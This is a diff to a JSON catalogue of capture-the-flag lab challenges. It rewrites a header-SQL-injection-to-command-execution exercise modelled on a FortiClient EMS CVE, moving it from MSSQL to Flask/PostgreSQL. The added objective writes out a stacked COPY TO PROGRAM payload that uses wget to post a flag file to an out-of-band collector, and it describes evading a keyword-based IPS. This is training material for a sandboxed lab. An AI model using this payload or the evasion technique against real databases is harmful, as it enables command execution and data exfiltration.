@@ -467,8 +467,8 @@
         "title": "MSSQL Header SQLi to RCE (FortiClient EMS Homage)",
         "difficulty": "elite",
         "description": "A device-registration endpoint accepts an X-FCTUID header and inserts it verbatim into a MSSQL query. Sysadmin privileges are held by the app account, and while xp_cmdshell is off, it can be turned on with stacked queries. Students chain header SQLi -> sp_configure -> xp_cmdshell -> read C:\\flag.txt -> OOB exfil. Chain length and defensive noise (a naive IPS logs 'SELECT' occurrences) test full-scenario tradecraft.",
-        "objective": "Register a device via POST /device/register with an X-FCTUID header payload that leads to command execution reading C:\\flag.txt. Exfil the flag via oob.lab:9000 and POST it to /solve.",
-        "flag_hint": "/solve verifies the flag string and echoes it back on match. C:\\flag.txt is written at container init with 0400 SYSTEM.",
+        "objective": "Bypass the naive keyword IPS on X-FCTUID (which flags SELECT/UNION/FROM), stack a COPY audit_log TO PROGRAM 'wget --post-file=/labflag/flag.txt http://oob:9000/x' through the superuser Postgres role, read what the in-lab OOB collector captured via GET /oob/received, and POST the recovered FLAG to /solve.",
+        "flag_hint": "Header SQLi -> stacked COPY <table> TO PROGRAM (superuser required; table source avoids the SELECT keyword the IPS flags) -> OOB exfil of the planted /labflag/flag.txt to the internal collector -> GET /oob/received (app-side proxy) -> POST /solve {\"flag\":\"FLAG{...}\"}. The DB is on a no-egress network; the collector sidecar is the only reachable listener.",
         "skills_taught": [
           "Header-based SQLi in enterprise endpoints",
           "Stacked queries + xp_cmdshell reenablement",
@@ -476,10 +476,12 @@
           "Evading naive keyword-based IPS"
         ],
         "tech_stack": [
-          "ASP.NET 8 on Windows Server Core 2022",
-          "MSSQL Server 2022 Standard",
-          "IIS 10",
-          "Custom OOB collector on Linux sidecar"
+          "Python 3.12",
+          "Flask 3.1",
+          "gunicorn 23",
+          "psycopg2 2.9",
+          "PostgreSQL 16.15 (superuser app role)",
+          "OOB collector sidecar"
         ],
         "inspired_by": "CVE-2023-48788 Fortinet FortiClient EMS SQLi to RCE (abstracted; no proprietary code reused)"
       },
